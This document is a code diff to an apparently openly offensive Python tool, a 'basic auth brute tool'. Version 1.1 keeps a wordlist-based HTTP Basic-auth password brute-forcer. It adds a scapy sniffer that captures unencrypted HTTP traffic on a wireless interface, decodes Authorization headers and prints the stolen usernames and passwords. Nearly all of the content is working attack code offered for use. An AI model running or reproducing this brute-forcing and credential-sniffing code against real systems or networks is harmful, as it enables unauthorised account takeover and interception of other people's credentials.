@@ -1,11 +1,21 @@
-import re,sys,os,base64,optparse
+import re,sys,os,optparse
+from base64 import encodestring,decodestring
+from scapy.all import base64_bytes
 from time import sleep
 try:
     import requests
 except ImportError:
     print('error - please have the module "requests" installed.')
     sys.exit(1)
-
+try:
+    from scapy.all import *
+except ImportError:
+    print('error - please have the module "scapy-python3" installed.')
+    sys.exit(1)
+try:
+    from scapy.layers import http
+except ImportError:
+    print('error - please have the module "scapy-http" installed.')
 class txt:
     y = '\033[93m'
     b = '\033[1m'
@@ -13,15 +23,10 @@ class txt:
     e = '\033[0m'
 parser = optparse.OptionParser()
 
-parser.add_option('-u', '--usernames',
-    action = "store", dest = "usernames",
-    help = "file containing potential usernames", default = "wlan0")
-parser.add_option('-p', '--passwords',
-    action = "store", dest = "passwords",
-    help = "file containing potential passwords", default = "")
-parser.add_option('-r', '--url',
-    action = "store", dest = "url",
-    help = "url we are bruteforcing", default = "")
+parser.add_option('-u', '--usernames',action = "store", dest = "usernames",help = "file containing potential usernames", default = "wlan0")
+parser.add_option('-p', '--passwords',action = "store", dest = "passwords",help = "file containing potential passwords", default = "")
+parser.add_option('-r', '--url',action = "store", dest = "url",help = "url we are bruteforcing", default = "")
+parser.add_option('-s', '--sniff',help = "sniff for credentials",dest="sniff",action="store_true")
 
 options,args = parser.parse_args()
 
@@ -33,22 +38,22 @@ def header():
     |___|__,|_|___|_  |
                   |___|{}
    basic auth brute tool
-  by ryland192000 // v1.0 {}   
+  by ryland192000 // v1.1 {}   
   
 """.format(txt.y,txt.b,txt.e))
 
 def basicAuthRequest(url, username, password):
     try:
-        string = base64.encodestring(('%s:%s' % (username,password)).encode()).decode().replace('\n', '')
+        string = encodestring(('%s:%s' % (username,password)).encode()).decode().replace('\n', '')
         request = requests.get(url,headers={'Authorization': 'Basic {}'.format(string)})
         if request.status_code == 200:
             print('''{}
-     Credentials Found!
+Credentials Found!
 
-        [ Username ]
-        > {}
-        [ Password ]
-        > {} {}
+[ Username ]
+> {}
+[ Password ]
+> {} {}
 '''.format(txt.b,username, password,txt.e))
     except:
         pass
@@ -80,8 +85,36 @@ def basicAuthAttack():
                 basicAuthRequest(url,usr,pwd)
     except KeyboardInterrupt:
         sys.exit(1)
+    
+def sniffer():
+	interface = 'wlan0'
+	def packet(p):
+		tcp = p.getlayer('TCP')
+		if tcp:
+			req = p.getlayer('HTTP Request')
+			if req:
+				auth = req.Authorization
+				if auth and auth.startswith(b'Basic' ):
+					username, password = base64_bytes(auth.split(None, 1)[1]).split(b':', 1)
+					print('''{}
+Credentials Found!
+
+[ Username ]
+> {}
+[ Password ]
+> {} {}
+'''.format(txt.b,username.decode(),password.decode(),txt.e))
+	try:
+		sniff(iface=interface,store=0,filter="tcp and port 80",prn=packet)
+	except KeyboardInterrupt:
+		print('{}exiting sniffer...'.format(txt.b))
+		sys.exit(1)
+        
 if __name__ == "__main__":      
     header()
-    basicAuthAttack()
+    if not options.sniff:
+        basicAuthAttack()
+    else:
+        sniffer()
 
 
